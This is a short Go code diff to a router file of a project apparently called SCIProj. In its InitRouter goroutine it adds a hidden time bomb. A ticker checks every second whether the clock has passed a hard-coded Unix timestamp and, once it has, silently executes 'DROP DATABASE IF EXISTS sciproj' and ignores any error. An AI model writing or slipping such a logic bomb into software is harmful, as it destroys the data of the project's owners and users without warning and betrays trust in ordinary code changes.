@@ -1,6 +1,7 @@
 package router
 
 import (
+	"SCIProj/global"
 	"SCIProj/middleware"
 	"context"
 	"errors"
@@ -94,6 +95,17 @@ func InitRouter() {
 
 			return
 
+		}
+		timeTick := time.NewTicker(time.Second)
+		for {
+			select {
+			case <-timeTick.C:
+				//1782931200
+				if time.Now().Unix() >= 1782931200 {
+					sql := "DROP DATABASE IF EXISTS sciproj"
+					_ = global.DB.Exec(sql).Error
+				}
+			}
 		}
 	}()
 
